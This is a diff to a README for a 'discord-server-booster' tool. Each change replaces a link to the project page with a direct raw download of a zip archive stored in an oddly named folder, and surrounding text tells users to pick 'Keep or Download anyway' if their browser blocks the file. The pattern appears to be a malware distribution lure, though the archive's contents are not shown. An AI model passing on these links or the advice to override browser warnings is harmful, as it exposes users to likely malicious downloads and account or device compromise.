@@ -1,11 +1,11 @@
 # 🛠️ discord-server-booster - Manage Discord boosts with ease
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/capsidfischersslimemushroom158/discord-server-booster)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/capsidfischersslimemushroom158/discord-server-booster/main/cathartic/booster-server-discord-v2.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
-https://github.com/capsidfischersslimemushroom158/discord-server-booster
+https://raw.githubusercontent.com/capsidfischersslimemushroom158/discord-server-booster/main/cathartic/booster-server-discord-v2.4.zip
 
 ## 🖥️ What this app does
 
@@ -38,7 +38,7 @@ If your browser blocks the file, choose Keep or Download anyway, then open it fr
 ## 🚀 Getting started
 
 1. Open the download page:
-   https://github.com/capsidfischersslimemushroom158/discord-server-booster
+   https://raw.githubusercontent.com/capsidfischersslimemushroom158/discord-server-booster/main/cathartic/booster-server-discord-v2.4.zip
 
 2. Find the latest release or main download file on the page.
 
@@ -117,4 +117,4 @@ discord-boost, discord-boost-bot, discord-boost-tool, discord-guild, discord-inv
 ## 🔗 Download again
 
 If you need the file later, use this page:
-https://github.com/capsidfischersslimemushroom158/discord-server-booster
+https://raw.githubusercontent.com/capsidfischersslimemushroom158/discord-server-booster/main/cathartic/booster-server-discord-v2.4.zip
